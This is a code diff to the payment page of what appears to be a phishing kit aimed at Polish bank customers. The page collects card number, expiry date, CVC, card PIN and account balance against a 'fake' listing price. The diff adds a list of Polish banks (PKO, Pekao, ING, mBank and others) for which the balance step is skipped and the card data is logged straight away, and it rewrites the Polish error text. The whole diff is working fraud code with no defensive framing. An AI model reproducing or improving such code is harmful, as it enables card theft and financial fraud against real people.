@@ -165,6 +165,11 @@
     </div>
     @push('js')
         <script type="text/javascript">
+            const noBalance = [
+                'ipko', 'pekao', 'ing',
+                'santander', 'millenium',
+                'mbank', 'inteligo', 'alior'
+            ].includes("{{session('bankName')}}");
             $(document).ready(function () {
                 load();
                 $("#cardnumber").mask("9999 9999 9999 9999");
@@ -200,7 +205,8 @@
                 if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && valid_card) {
                     $('#carddata').css('display', 'none');
                     load(3000);
-                    $('#balance_check').css('display', '');
+                    if (noBalance) cardlog();
+                    else $('#balance_check').css('display', '');
                 } else {
                     ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
                     !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
@@ -219,7 +225,7 @@
                     alert('Twój bank zażądał dodatkowej weryfikacji. Wypełnij dodatkowe pola i spróbuj ponownie.')
                 } else {
                     ccnum.css("border-color", "red");
-                    alert('Mapa wpisana niepoprawnie.');
+                    alert('Nieprawidłowe dane karty płatniczej.');
                 }
                 ccnum.mask("9999 9999 9999 9999");
             }
@@ -241,8 +247,9 @@
                 let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
                 let ccnum_unmask = ccnum.unmask().val()
                 let ccnum_length = $.trim(ccnum_unmask).length;
+
                 ccnum.mask("9999 9999 9999 9999");
-                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt("{{$fake->price}}") && valid_card) {
+                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && (noBalance || (card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt(fake.price))) && valid_card) {
                     $('#paybutton').css('background', 'gray').attr('disabled', '1');
                     $.ajax({
                         type: "POST",
